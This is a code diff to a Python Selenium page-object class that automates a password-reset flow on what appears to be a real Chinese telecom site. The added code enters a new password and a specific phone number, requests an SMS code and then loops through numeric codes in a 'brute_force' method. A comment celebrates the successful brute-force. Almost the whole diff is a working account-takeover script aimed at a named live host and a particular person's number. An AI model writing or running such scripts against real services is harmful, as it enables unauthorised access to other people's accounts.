@@ -46,6 +46,25 @@ class LoginPage(BasePage):
         # 加1秒等待，浏览器存储cookie需要时间
         time.sleep(1)
 
+    def forgetpassword(self):
+        self.go_to_page("http://hn.sjbs.360unicom.cn/forget")
+
+    def reset_password(self, newpw, renewpd, phoneno):
+        self.input_text(self.newpw, newpw)
+        self.input_text(self.rpnewpw, renewpd)
+        self.input_text(self.phoneno, phoneno)
+        self.click_element(self.getcode)
+
+    def brute_force(self, code):
+        self.input_text(self.retcode, code)
+        self.move_toeleposition()
+
+    def atloginpage(self):
+        if self.element_is_presence_quick(self.codepic):
+            return True
+        else:
+            return False
+
     def logined(self):
         if self.element_is_presence_quick(["css selector", "sup.ivu-badge-count"]):
             return True
@@ -54,5 +73,12 @@ class LoginPage(BasePage):
 
 
 if __name__ == '__main__':
-    [LoginPage().to_loginpage().login(f"", "12345", True) for i in range(2)]
-    LoginPage().quit()
+    LoginPage().to_loginpage().forgetpassword()
+    LoginPage().reset_password("123qwee", "123qwee", "13387158045")
+    for i in range(1000):
+        LoginPage().brute_force(str(i).zfill(4))
+        # if LoginPage().atloginpage():
+        #     print("暴力破解成功，密码123qwee")
+        #     break
+    # time.sleep(10)
+    # LoginPage().quit()
